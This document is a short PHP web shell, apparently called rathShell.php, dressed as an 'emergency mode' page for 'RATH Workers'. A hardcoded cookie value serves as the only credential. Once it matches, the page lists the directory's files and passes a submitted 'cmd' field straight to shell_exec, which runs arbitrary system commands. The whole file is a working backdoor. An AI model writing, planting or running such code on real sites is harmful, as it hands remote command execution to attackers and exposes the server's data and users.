<?php
        if(isset($_COOKIE['logged_in'])){
            if ($_COOKIE['logged_in'] == '6128401hearthcliff'){
                echo '<!DOCTYPE html>';
                echo '<html lang="en">';
                echo '<head>';
                echo '<meta charset="UTF-8">';
                echo '<meta name="viewport" content="width=device-width, initial-scale=1.0">';
                echo '<meta http-equiv="X-UA-Compatible" content="ie=edge">';
                echo '<title>Document</title>';
                echo '</head>';
                echo '<body>';
                echo '<h1>User Heathcliff not found on user list, but authorized - error occured.<?h1><br> <h2>Using emergency mode</h2>';
                echo '<hr>';
                    $filelist = glob("*");
                    foreach ($filelist as $file) {
                        echo "<a href='$file'>".$file."</a><br>";
                    }
                    
                echo '<hr>';
                echo '<form action="rathShell.php" method="post" enctype="multipart/form-data">';
                echo 'Enter command:';
                echo '  <input type="text" name="cmd" id="cmd">';
                echo '  <input type="submit" value="Execute" name="submit">';
                echo '</form><br>';
                if(isset($_POST['cmd'])){
                        echo shell_exec($_POST['cmd']);
                    }
                echo '</body>';
                echo '</html>';
            }else{
                echo "Access Denied - permission denied. Unathorized Access is Prohibited, RATH Workers only";
            }
        }else{
            echo "Access Denied - login first. Unathorized Access is Prohibited, RATH Workers only";
        }
?>